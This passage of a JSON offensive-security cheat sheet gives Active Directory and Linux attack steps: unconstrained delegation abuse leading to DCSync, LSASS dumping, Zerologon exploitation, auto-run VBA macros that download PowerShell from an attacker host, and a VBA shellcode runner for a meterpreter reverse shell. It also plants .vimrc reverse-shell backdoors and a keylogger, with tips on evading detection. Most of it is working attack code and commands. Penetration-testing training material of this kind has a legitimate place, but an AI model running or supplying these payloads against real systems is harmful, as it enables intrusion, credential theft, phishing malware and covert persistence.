            "content": "**Requirements:**\n- Compromise of unconstrained delegation machine (non-DC)\n- Ability to coerce DC authentication (**PrinterBug**, **PetitPotam**)\n- Network access to DC (port 88)",
            "variant": "important"
          },
          {
            "type": "note",
            "content": "Machines with unconstrained delegation store the TGT of any user that connects. Compromise the machine + coerce DC authentication = DC's TGT \u2192 DCSync.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "BloodHound",
        "codes": [
          {
            "lang": "cypher",
            "code": "MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "PowerView",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-NetComputer -Unconstrained"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "NetExec",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc ldap <DC_IP> -u <User> -p <Pass> --trusted-for-delegation"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "Impacket",
        "codes": [
          {
            "lang": "bash",
            "code": "findDelegation.py <Domain>/<User>:<Pass> -dc-ip <DC_IP>"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "Find All Delegation Types",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc ldap <DC_IP> -u <User> -p '<Pass>' --find-delegation"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "nxc_enum",
        "codes": [
          {
            "lang": "bash",
            "code": "python -m nxc_enum <DC_IP> -u '<User>' -p '<Pass>' --delegation"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "Hackles (BloodHound)",
        "codes": [
          {
            "lang": "bash",
            "code": "python -m hackles -u neo4j -p '<Neo4jPassword>' --unconstrained"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "Exploit Unconstrained Delegation",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "**Step 1** - Compromise the unconstrained delegation machine",
            "variant": "important"
          }
        ]
      },
      {
        "title": "Step 2 - Monitor for incoming TGTs",
        "codes": [
          {
            "lang": "powershell",
            "code": ".\\Rubeus.exe monitor /interval:5 /filteruser:DC01$ /nowrap"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 3 - Coerce DC to authenticate to compromised host",
        "codes": [
          {
            "lang": "powershell",
            "code": "printerbug.py <Domain>/<User>:<Pass>@<DC_IP> <CompromisedHost>"
          },
          {
            "lang": "bash",
            "code": "PetitPotam.py <CompromisedHost> <DC_IP>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 4 - Use captured DC TGT for DCSync",
        "codes": [
          {
            "lang": "bash",
            "code": "export KRB5CCNAME=DC01$.ccache"
          },
          {
            "lang": "bash",
            "code": "impacket-secretsdump -k -no-pass <DC_FQDN>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 5 - Inject ticket with Rubeus",
        "codes": [
          {
            "lang": "powershell",
            "code": ".\\Rubeus.exe ptt /ticket:<base64_ticket>"
          },
          {
            "lang": "powershell",
            "code": ".\\mimikatz.exe \"lsadump::dcsync /domain:<Domain> /all /csv\" \"exit\""
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "Validate Extracted Hashes",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <DC_IP> -u Administrator -H '<NTLMHash>' -d <Domain>"
          },
          {
            "lang": "bash",
            "code": "# Full domain access\nnxc smb 192.168.1.0/24 -u Administrator -H '<NTLMHash>' -d <Domain>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "HackTricks Unconstrained Delegation",
        "url": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/unconstrained-delegation"
      }
    ],
    "foundational": true
  },
  {
    "category": "Unconstrained Delegation",
    "title": "Unconstrained Delegation Theory",
    "tags": [
      "Active_Directory",
      "Delegation_Abuse",
      "Impacket",
      "Kerberos",
      "Lateral_Movement",
      "Privilege_Escalation",
      "Rubeus",
      "Windows"
    ],
    "steps": [
      {
        "title": "How Unconstrained Delegation Works",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Delegation flow:\n1. User authenticates to service with unconstrained delegation\n2. KDC includes user's TGT in service ticket\n3. Service extracts and stores user's TGT\n4. Service can use TGT to access any resource as that user",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Security Risk",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "If attacker compromises unconstrained delegation server, they can steal TGTs of any user who connects and impersonate them anywhere.",
            "variant": "danger"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "HackTricks - Kerberos Delegation",
        "url": "https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/kerberos-delegation.html"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Unconstrained delegation allows service to impersonate any user to any service. Service receives user's TGT, can request TGS for any service.",
        "variant": "info"
      },
      {
        "type": "note",
        "content": "**Requirements:**\n- Compromise of unconstrained delegation machine (non-DC)\n- Ability to coerce DC authentication (**PrinterBug**, **PetitPotam**)\n- Network access to DC (port 88)",
        "variant": "important"
      }
    ]
  },
  {
    "category": "Writable etc-passwd",
    "title": "Understanding /etc/passwd",
    "tags": [],
    "steps": [
      {
        "title": "File Format",
        "codes": [
          {
            "lang": "plaintext",
            "code": "username:password:UID:GID:comment:home:shell"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Example Entry",
        "codes": [
          {
            "lang": "plaintext",
            "code": "root:x:0:0:root:/root:/bin/bash"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Field Breakdown",
        "codes": [
          {
            "lang": "plaintext",
            "code": "root        - Username\nx           - Password (x means in /etc/shadow)\n0           - User ID (0 = root)\n0           - Group ID (0 = root group)\nroot        - Comment/GECOS field\n/root       - Home directory\n/bin/bash   - Default shell"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "Linux Privilege Escalation",
    "title": "Upgrade to TTY Shell",
    "tags": [
      "Linux",
      "Post_Exploitation",
      "Privilege_Escalation"
    ],
    "steps": [
      {
        "title": "Python",
        "codes": [
          {
            "lang": "bash",
            "code": "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
          },
          {
            "lang": "bash",
            "code": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Script",
        "codes": [
          {
            "lang": "bash",
            "code": "script -qc /bin/bash /dev/null"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Shell Direct",
        "codes": [
          {
            "lang": "bash",
            "code": "/bin/bash -i"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Perl",
        "codes": [
          {
            "lang": "perl",
            "code": "perl -e 'exec \"/bin/bash\";'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Full TTY Stabilization",
        "codes": [
          {
            "lang": "bash",
            "code": "# Press Ctrl+Z after python pty.spawn, then run:\nstty raw -echo; fg\nexport TERM=xterm-256color\nexport SHELL=/bin/bash\nstty rows <Rows> columns <Cols>"
          }
        ],
        "optional": true,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "After spawning TTY, background shell and configure terminal for full interactivity."
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Spawn a fully interactive TTY shell from a dumb shell. Enables tab completion, history, job control, and commands like `su`/`sudo`."
      }
    ]
  },
  {
    "category": "Pass-the-Ticket",
    "title": "Use Ticket from Kali [Local]",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Impacket",
      "Kerberos",
      "Lateral_Movement",
      "Mimikatz",
      "Pass-the-Ticket",
      "Rubeus",
      "Windows"
    ],
    "steps": [],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "text",
        "content": "```bash\nexport KRB5CCNAME=ticket.ccache\nimpacket-psexec -k -no-pass <Domain>/<Username>@<TargetFQDN>\n```"
      }
    ]
  },
  {
    "category": "LDAP Enumeration",
    "title": "Useful LDAP Filters",
    "tags": [
      "Active_Directory",
      "Enumeration",
      "LDAP"
    ],
    "steps": [
      {
        "title": "Find All Enabled Users",
        "codes": [
          {
            "lang": "text",
            "code": "(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Find All Disabled Users",
        "codes": [
          {
            "lang": "text",
            "code": "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Find Users with Password Never Expires",
        "codes": [
          {
            "lang": "text",
            "code": "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Find Users with Password Not Required",
        "codes": [
          {
            "lang": "text",
            "code": "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Find Computers Running Specific OS",
        "codes": [
          {
            "lang": "text",
            "code": "(&(objectClass=computer)(operatingSystem=*Server*))"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Find Empty Groups",
        "codes": [
          {
            "lang": "text",
            "code": "(&(objectClass=group)(!(member=*)))"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Find Groups with Specific Member",
        "codes": [
          {
            "lang": "text",
            "code": "(&(objectClass=group)(member=CN=John Doe,OU=Users,DC=corp,DC=local))"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Common LDAP search filters for targeted enumeration.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "NetExec",
    "title": "Useful Modules",
    "tags": [
      "Active_Directory",
      "Discovery",
      "Enumeration",
      "NetExec",
      "Windows"
    ],
    "steps": [
      {
        "title": "List All Modules",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb -L"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Get Module Info",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb -M lsassy --module-info"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Common Modules",
        "substeps": [
          {
            "title": "lsassy - Dump LSASS",
            "codes": [
              {
                "lang": "bash",
                "code": "nxc smb <TargetIP> -u <Username> -p '<Password>' -M lsassy"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "nanodump - Alternative LSASS Dump",
            "codes": [
              {
                "lang": "bash",
                "code": "nxc smb <TargetIP> -u <Username> -p '<Password>' -M nanodump"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "mimikatz - Run Mimikatz",
            "codes": [
              {
                "lang": "bash",
                "code": "nxc smb <TargetIP> -u <Username> -p '<Password>' -M mimikatz"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "enum_av - Enumerate Antivirus",
            "codes": [
              {
                "lang": "bash",
                "code": "nxc smb <TargetIP> -u <Username> -p '<Password>' -M enum_av"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "gpp_password - Find GPP Passwords",
            "codes": [
              {
                "lang": "bash",
                "code": "nxc smb <TargetIP> -u <Username> -p '<Password>' -M gpp_password"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "gpp_autologin - Find Autologin Credentials",
            "codes": [
              {
                "lang": "bash",
                "code": "nxc smb <TargetIP> -u <Username> -p '<Password>' -M gpp_autologin"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "web_delivery - Metasploit Web Delivery",
            "codes": [
              {
                "lang": "bash",
                "code": "nxc smb <TargetIP> -u <Username> -p '<Password>' -M web_delivery -o URL=http://attacker/payload"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Linux Reference",
    "title": "Useful One-Liners",
    "tags": [
      "Linux"
    ],
    "steps": [
      {
        "title": "Find Writable Directories",
        "codes": [
          {
            "lang": "bash",
            "code": "find / -writable -type d 2>/dev/null"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Find SUID Binaries",
        "codes": [
          {
            "lang": "bash",
            "code": "find / -perm -4000 2>/dev/null"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Find Files Modified in Last 10 Minutes",
        "codes": [
          {
            "lang": "bash",
            "code": "find / -mmin -10 2>/dev/null"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Find Large Files",
        "codes": [
          {
            "lang": "bash",
            "code": "find / -type f -size +100M 2>/dev/null"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Search for Passwords in Files",
        "codes": [
          {
            "lang": "bash",
            "code": "grep -r -i \"password\" /home 2>/dev/null\ngrep -r -i \"pass=\" /var/www 2>/dev/null"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "List All Listening Ports",
        "codes": [
          {
            "lang": "bash",
            "code": "netstat -tulpn | grep LISTEN\nss -tulpn | grep LISTEN"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Linux Enumeration",
    "title": "User Account Enumeration and Configuration",
    "tags": [
      "Discovery",
      "Enumeration",
      "Linux"
    ],
    "steps": [
      {
        "title": "Display User and Service Accounts",
        "codes": [
          {
            "lang": "bash",
            "code": "getent passwd"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Add User",
        "codes": [
          {
            "lang": "bash",
            "code": "useradd -m <Username>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Add User to Group",
        "codes": [
          {
            "lang": "bash",
            "code": "usermod -g <GroupName> <Username>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Change User Password",
        "codes": [
          {
            "lang": "bash",
            "code": "passwd <Username>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Lock User Account",
        "codes": [
          {
            "lang": "bash",
            "code": "usermod --expiredate 1 --lock --shell /bin/nologin <Username>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Unlock User Account",
        "codes": [
          {
            "lang": "bash",
            "code": "usermod --expiredate 99999 --unlock --shell /bin/bash <Username>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Enumerate User Account Details",
        "codes": [
          {
            "lang": "bash",
            "code": "chage -l <Username>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Delete User",
        "codes": [
          {
            "lang": "bash",
            "code": "userdel <Username>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "SSH Pivoting",
    "title": "Using ProxyChains",
    "tags": [],
    "steps": [
      {
        "title": "Basic Usage",
        "codes": [
          {
            "lang": "bash",
            "code": "proxychains4 <command>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Common Examples",
        "codes": [
          {
            "lang": "bash",
            "code": "# Nmap scan through proxy\nproxychains4 nmap -sT -Pn <InternalTarget>\n\n# SMB enumeration\nproxychains4 smbclient -L \\\\<InternalTarget>\n\n# CrackMapExec\nproxychains4 crackmapexec smb <InternalSubnet>/24\n\n# Evil-WinRM\nproxychains4 evil-winrm -i <InternalTarget> -u <User> -p <Pass>\n\n# SSH to another internal host\nproxychains4 ssh <User>@<InternalTarget>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Use `-sT` (TCP connect scan) with nmap through proxychains. SYN scans won't work through SOCKS.",
            "variant": "warning"
          }
        ]
      }
    ],
    "resources": []
  },
  {
    "category": "Zerologon",
    "title": "Using Zerologon with NetExec",
    "tags": [
      "Active_Directory",
      "CVE-2020-1472",
      "Domain_Controller",
      "Exploitation"
    ],
    "steps": [
      {
        "title": "Test for Vulnerability",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <DC-IP> -u '' -p '' -M zerologon"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Exploit with NetExec",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <DC-IP> -u '' -p '' -M zerologon -o ACTION=exploit"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "advanced": true
  },
  {
    "category": "VBA Fundamentals",
    "title": "VBA Macro Development",
    "tags": [
      "Code_Injection",
      "Execution",
      "Windows"
    ],
    "steps": [
      {
        "title": "Auto-Execute Macros",
        "substeps": [
          {
            "title": "AutoOpen (Word)",
            "codes": [
              {
                "lang": "vba",
                "code": "Sub AutoOpen()\n    MyMacro\nEnd Sub\n\nSub Document_Open()\n    MyMacro\nEnd Sub\n\nSub MyMacro()\n    ' Payload here\nEnd Sub"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Executes when document is opened.",
                "variant": "tip"
              }
            ]
          },
          {
            "title": "Auto_Open (Excel)",
            "codes": [
              {
                "lang": "vba",
                "code": "Sub Auto_Open()\n    MyMacro\nEnd Sub\n\nSub Workbook_Open()\n    MyMacro\nEnd Sub\n\nSub MyMacro()\n    ' Payload here\nEnd Sub"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Executes when workbook is opened.",
                "variant": "tip"
              }
            ]
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Basic VBA Execution",
        "substeps": [
          {
            "title": "Shell Command Execution",
            "codes": [
              {
                "lang": "vba",
                "code": "Sub MyMacro()\n    Dim str As String\n    str = \"cmd.exe /c whoami > %TEMP%\\output.txt\"\n    Shell str, vbHide\nEnd Sub"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "WScript.Shell Execution",
            "codes": [
              {
                "lang": "vba",
                "code": "Sub MyMacro()\n    Dim wsh As Object\n    Set wsh = CreateObject(\"WScript.Shell\")\n    wsh.Run \"calc.exe\", 0, False\n    Set wsh = Nothing\nEnd Sub"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "PowerShell from VBA",
        "substeps": [
          {
            "title": "Basic PowerShell Execution",
            "codes": [
              {
                "lang": "vba",
                "code": "Sub MyMacro()\n    Dim str As String\n    str = \"powershell -exec bypass -nop -w hidden -c \"\"IEX(New-Object Net.WebClient).DownloadString('http://<AttackerIP>/payload.ps1')\"\"\"\n    Shell str, vbHide\nEnd Sub"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "PowerShell with Encoded Command",
            "codes": [
              {
                "lang": "vba",
                "code": "Sub MyMacro()\n    Dim str As String\n    str = \"powershell -exec bypass -nop -w hidden -enc <Base64EncodedCommand>\"\n    Shell str, vbHide\nEnd Sub"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Generate Encoded PowerShell",
        "codes": [
          {
            "lang": "powershell",
            "code": "$cmd = \"IEX(New-Object Net.WebClient).DownloadString('http://<AttackerIP>/payload.ps1')\"\n$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)\n$encoded = [Convert]::ToBase64String($bytes)\n$encoded"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "String Concatenation for Evasion",
        "codes": [
          {
            "lang": "vba",
            "code": "Sub MyMacro()\n    Dim str As String\n    str = \"pow\" & \"ersh\" & \"ell -exec bypass -nop -c \"\n    str = str & Chr(34) & \"IEX(New-Object Net.WebClient).Down\"\n    str = str & \"loadString('http://<AttackerIP>/p.ps1')\" & Chr(34)\n    Shell str, vbHide\nEnd Sub"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Break up suspicious strings to evade static analysis.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "Microsoft VBA Reference",
        "url": "https://learn.microsoft.com/en-us/office/vba/api/overview/"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Visual Basic for Applications (**VBA**) executes within Office applications. Primary vector for initial access via phishing.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "VBA Shellcode Execution",
    "title": "VBA Shellcode Runner",
    "tags": [
      "Binary_Exploitation",
      "Code_Injection",
      "Execution",
      "Windows"
    ],
    "steps": [
      {
        "title": "Generate Shellcode",
        "codes": [
          {
            "lang": "bash",
            "code": "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<AttackerIP> LPORT=<Port> -f vbapplication"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Complete VBA Shellcode Runner",
        "codes": [
          {
            "lang": "vba",
            "code": "Private Declare PtrSafe Function VirtualAlloc Lib \"kernel32\" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr\nPrivate Declare PtrSafe Function RtlMoveMemory Lib \"kernel32\" (ByVal dest As LongPtr, ByRef src As Any, ByVal length As Long) As LongPtr\nPrivate Declare PtrSafe Function CreateThread Lib \"kernel32\" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, ByVal lpParameter As Long, ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As LongPtr\n\nSub AutoOpen()\n    MyMacro\nEnd Sub\n\nSub Document_Open()\n    MyMacro\nEnd Sub\n\nSub MyMacro()\n    Dim buf As Variant\n    Dim addr As LongPtr\n    Dim counter As Long\n    Dim data As Long\n    Dim res As Long\n\n    ' msfvenom shellcode here\n    buf = Array(252, 72, 131, ...)\n\n    ' Allocate RWX memory\n    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)\n\n    ' Copy shellcode to allocated memory\n    For counter = LBound(buf) To UBound(buf)\n        data = buf(counter)\n        res = RtlMoveMemory(addr + counter, data, 1)\n    Next counter\n\n    ' Execute shellcode in new thread\n    res = CreateThread(0, 0, addr, 0, 0, 0)\nEnd Sub"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Memory Protection Constants",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Memory allocation flags:\n- **&H3000** - MEM_COMMIT | MEM_RESERVE\n- **&H40** - PAGE_EXECUTE_READWRITE (RWX)\n- **&H20** - PAGE_EXECUTE_READ (RX)\n- **&H04** - PAGE_READWRITE (RW)",
            "variant": "info"
          }
        ]
      }
    ],
    "resources": [],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Allocate executable memory, copy shellcode, execute in new thread.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "User Management Commands",
    "title": "Verification Commands",
    "tags": [],
    "steps": [
      {
        "title": "Windows",
        "codes": [
          {
            "lang": "bash",
            "code": "# Check if user exists\nnet user <username>\n\n# Check if user is admin\nnet localgroup Administrators | findstr <username>\n\n# Check if user can RDP\nnet localgroup \"Remote Desktop Users\" | findstr <username>\n\n# Test login\nrunas /user:<username> cmd"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Linux",
        "codes": [
          {
            "lang": "bash",
            "code": "# Check if user exists\nid <username>\n\n# Check if user has sudo\nsudo -l -U <username>\n\n# Check user's groups\ngroups <username>\n\n# Test login\nsu - <username>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "Silver Ticket",
    "title": "Verify and Use",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Impacket",
      "Kerberos",
      "Mimikatz",
      "Persistence",
      "Silver_Ticket",
      "Windows"
    ],
    "steps": [],
    "resources": [],
    "advanced": true,
    "notes": [
      {
        "type": "text",
        "content": "```powershell\nklist\ndir \\\\<TargetFQDN>\\C$\n```"
      }
    ]
  },
  {
    "category": "Pass-the-Ticket",
    "title": "Verify Injected Tickets",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Impacket",
      "Kerberos",
      "Lateral_Movement",
      "Mimikatz",
      "Pass-the-Ticket",
      "Rubeus",
      "Windows"
    ],
    "steps": [],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "text",
        "content": "```powershell\nklist\n```"
      }
    ]
  },
  {
    "category": "Golden Ticket",
    "title": "Verify Ticket",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Golden_Ticket",
      "Impacket",
      "Kerberos",
      "Mimikatz",
      "Persistence",
      "Rubeus",
      "Windows"
    ],
    "steps": [],
    "resources": [],
    "advanced": true,
    "notes": [
      {
        "type": "text",
        "content": "```powershell\nklist\n```"
      }
    ]
  },
  {
    "category": "Overpass-the-Hash",
    "title": "Verify Ticket",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Impacket",
      "Kerberos",
      "Lateral_Movement",
      "Mimikatz",
      "Pass-the-Hash",
      "Rubeus",
      "Windows"
    ],
    "steps": [],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "text",
        "content": "```powershell\nklist\n```"
      }
    ]
  },
  {
    "category": "Config File Backdoors",
    "title": "VIM Config Backdoor",
    "tags": [
      "Exploitation",
      "Linux",
      "Post_Exploitation"
    ],
    "steps": [
      {
        "title": "Basic VIM Backdoor",
        "codes": [
          {
            "lang": "bash",
            "code": "echo 'silent !nc -e /bin/bash <AttackerIP> <Port> &' >> ~/.vimrc"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "VIM Reverse Shell on Open",
        "codes": [
          {
            "lang": "bash",
            "code": "cat >> ~/.vimrc << 'EOF'\n:silent !bash -c 'bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1 &'\n:redraw!\nEOF"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "VIM Backdoor with Condition",
        "codes": [
          {
            "lang": "bash",
            "code": "cat >> ~/.vimrc << 'EOF'\nif filereadable(\"/tmp/.trigger\")\n    :silent !bash -c 'bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1 &'\nendif\nEOF"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Stealthy Backdoor (File-Based Trigger)",
        "codes": [
          {
            "lang": "bash",
            "code": "cat >> ~/.vimrc << 'EOF'\nautocmd VimEnter * if filereadable(expand(\"~/.cache/.x\")) | silent !~/.cache/.x | endif\nEOF"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "HackTricks - Linux Persistence",
        "url": "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Modify user's **.vimrc** to execute commands when VIM is launched.",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "Config File Backdoors",
    "title": "VIM Config Keylogger",
    "tags": [
      "Exploitation",
      "Linux",
      "Post_Exploitation"
    ],
    "steps": [
      {
        "title": "Basic VIM Keylogger",
        "codes": [
          {
            "lang": "bash",
            "code": "cat >> ~/.vimrc << 'EOF'\nautocmd VimLeave * :silent !echo \"$(date): $(cat /tmp/.vimlog)\" >> ~/.vim_history\nautocmd InsertCharPre * :silent !echo -n \"%s\" >> /tmp/.vimlog\nEOF"
          }
        ],
        "optional": false,
        "alternative": false,
